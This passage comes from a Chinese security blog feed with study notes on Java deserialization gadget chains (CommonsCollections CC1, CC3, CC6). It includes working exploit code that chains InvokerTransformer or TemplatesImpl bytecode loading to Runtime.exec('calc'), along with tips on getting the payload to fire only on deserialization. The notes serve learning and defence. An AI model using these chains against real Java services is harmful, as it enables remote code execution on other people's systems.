(TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合InstantiateTransformer类，我们只需要实例化TrAXFilter类即可调用templates.newTransformer()方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, InvocationTargetException, InstantiationException, NoSuchMethodException &#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> TemplatesImpl.class;</span><br><span class="line">    <span class="comment">// 设置_name不为空</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">    <span class="comment">// 定义字节码，反射修改_bytecodes的值</span></span><br><span class="line">    <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Study\\java sec\\04\\target\\classes\\outCalc.class&quot;</span>));</span><br><span class="line">    <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    bytecodesField.set(templates,codes);</span><br><span class="line">    <span class="comment">// _tfactory赋值</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">    tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        调用测试</span></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">    Transformer[] transformedMaps = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformedMaps);</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chainedTransformer);</span><br><span class="line"></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(<span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>(<span class="number">1</span>), <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">    hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">    <span class="comment">// 传入的tiedMapEntry</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> TiedMapEntry.class;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">map</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">    map.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    map.set(tiedMapEntry,lazyMap);</span><br><span class="line"></span><br><span class="line"><span class="comment">//  serialize(hashMap);</span></span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这一周学了java反序列化漏洞的CC1、CC3、CC6三条利用链，做一个总结吧。</p><p>首先CC1， InvokeTransformer.transform方法为包裹的反射，通过它可以调用任意类方法，此时我们需要某个类的readObject方法中调用它，通过查找找到一条链路： LazyMap是Map的实现类，LazyMap.get方法调用了transform， 而AnnotationInvocationHandler.invoke中调用了Map类型的get方法，AnnotationInvocationHandler是InvocationHandler的实现类，是一个代理类，通过调用代理类型Map的任意方法可调用AnnotationInvocationHandler.invoke，而AnnotationInvocationHandler的readObject方法中调用了Map类型的entrySet，且该方法为无参方法符合invoke方法中调用Map类型的get方法的逻辑，是一条完美的利用链。</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201952999.png" alt="img"></p><p>但是在jdk8u71版本之后的AnnotationInvocationHandler的readObject方法代码改变了</p><p>1、调用entrySet方法的是Map&lt;String, Object&gt; streamVals，而不是我们赋值的memberValues。</p><p>2、不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。后续对Map的操作都是基于这个新的LinkedHashMap对象，而不是原来我们精心构造的Map。</p><p>导致CC1无法成功利用。</p><p>然后CC6，LazyMap类中get方法调用了transform，而TiedMapEntry类的getValue调用了get方法，TiedMapEntry类hashCode方法调用了getValue，HashMap类hash方法调用了hashCode，HashMap类readObject方法调用了hash。<img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201952050.png" alt="img"></p><p>这是一条完美的利用链，并且它能够在jdk的高版本中使用。</p><p>最后CC3，先说一下为什么需要CC3，CC3中换了一种命令执行的方式，它是通过TemplatesImpl类达到加载恶意代码执行的效果，而且这条利用链中没有使用InvokeTransformer类，有绕过过滤的效果。</p><p>TemplatesImpl类中静态类成员TransletClassLoader中继承ClassLoader类并重写了defineClass，导致可以加载class字节。defineTransletClasses方法中调用了defineClass，getTransletInstance方法中调用了defineTransletClasses，newTransformer（公有方法）方法中调用了getTransletInstance。而TrAXFilter类的构造方法中调用了newTransformer其对象为Templates（TemplatesImpl是Templates的实现类），InstantiateTransformer的transform的功能是获取构造器，调用类的构造方法的，正好符合。<img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201952454.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> JavaWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化CommonsCollections利用链篇二</title>
      <link href="/2023/03/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections%E5%88%A9%E7%94%A8%E9%93%BE%E7%AF%87%E4%BA%8C/"/>
      <url>/2023/03/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections%E5%88%A9%E7%94%A8%E9%93%BE%E7%AF%87%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="JDK8u71版本后绕过–CC6"><a href="#JDK8u71版本后绕过–CC6" class="headerlink" title="JDK8u71版本后绕过–CC6"></a>JDK8u71版本后绕过–CC6</h1><p>当我们拿上面POC去攻击服务的时候会发现，无法命令执行，这是因为JDK在8u71版本之后对AnnotationInvocationHandler做了修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; t = (Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt;)fields.get(<span class="string">&quot;type&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(<span class="string">&quot;memberValues&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(t);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">    <span class="comment">// consistent with runtime Map type</span></span><br><span class="line">    Map&lt;String, Object&gt; mv = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                value = <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        mv.put(name, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    UnsafeAccessor.setType(<span class="built_in">this</span>, t);</span><br><span class="line">    UnsafeAccessor.setMemberValues(<span class="built_in">this</span>, mv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​memberValues。。。<br>​就把CC1的后半条链，AnnotationInvocationHandler.readObject给pass掉了。</p><p>因此有出现了一条新的链：</p><p>首先我们知道LazyMap类的get方法中调用了transform方法，且参数都可控。那我们就需要找谁的方法中调用了get且参数可控，这就太多了，ysoserial的作者提供了一条链，HashMap类的readObject方法中调用了hashCode方法，CC依赖中的TiedMapEntry类的hashCode方法中调用了内部的getValue方法，getValue中调用了get方法，且参数都可控。那这就是一条无需AnnotationInvocationHandler来实现攻击的一条链。整条链的调用：</p><p>InvokerTransformer.transform()能够在LazyMap.get()方法中调用 &#x3D;&#x3D;&gt;&gt;</p><p>LazyMap.get()方法能够在TiedMapEntry.getValue()方法中调用 &#x3D;&#x3D;&gt;&gt;</p><p>TiedMapEntry.getValue()方法能在TiedMapEntry.hashCode()方法调用 &#x3D;&#x3D;&gt;&gt;</p><p>TiedMapEntry.hashCode()方法能在HashMap.hash()方法中调用 &#x3D;&#x3D;&gt;&gt;</p><p>HashMap.hash()方法能在HashMap.readObject方法中调用。</p><p>这是条完美的利用链。</p><p>参数顺理传递：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">    <span class="comment">// CC链的危险类</span></span><br><span class="line">    Transformer[] transformedMaps = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformedMaps);</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chainedTransformer);</span><br><span class="line"></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">    hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);<span class="comment">// put的时候会调用hashCode方法。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201949939.png" alt="img"></p><p>当我们序列化的时候就会发现它弹出了计算器，这使因为HashMap在调用put的时候会对key调用一次hashCode方法。如何解决？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​key为空就可以了。我们可以令tiedMapEntry为空。在序列化时在传入值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    <span class="comment">// CC链的危险类</span></span><br><span class="line">    Transformer[] transformedMaps = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformedMaps);</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chainedTransformer);</span><br><span class="line"></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(<span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>(<span class="number">1</span>), <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">    hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"><span class="comment">// 传入的tiedMapEntry</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> TiedMapEntry.class;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">map</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">    map.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    map.set(tiedMapEntry,lazyMap);</span><br><span class="line"></span><br><span class="line">    hashMap.hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我看网上有的博主修改的是LazyMap为空，然后在修改lazyMap。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    <span class="comment">// CC链的危险类</span></span><br><span class="line">    Transformer[] transformedMaps = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformedMaps);</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">    hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">    factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">    serialize(hashMap);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​发现这样并没有弹出计算器。这是为什么？</p><p>原因在于LazyMap类的get方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​当我们生成序列化数据的时候，这里会判断我们传入的map中是否含有这个key，也就是lazyMap中的第一个参数map（它是空的）。这就进入if条件，if条件中就会吧这个key放入到map中，就会导致我们在反序列化的时候map中包含这个key值，解决办法就是在序列化之前把tiedMapEntry的key值给remove掉。</p>]]></content>
      
      
      <categories>
          
          <category> JavaWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化CommonsCollections利用链篇一</title>
      <link href="/2023/03/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections%E5%88%A9%E7%94%A8%E9%93%BE%E7%AF%87%E4%B8%80/"/>
      <url>/2023/03/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections%E5%88%A9%E7%94%A8%E9%93%BE%E7%AF%87%E4%B8%80/</url>
      
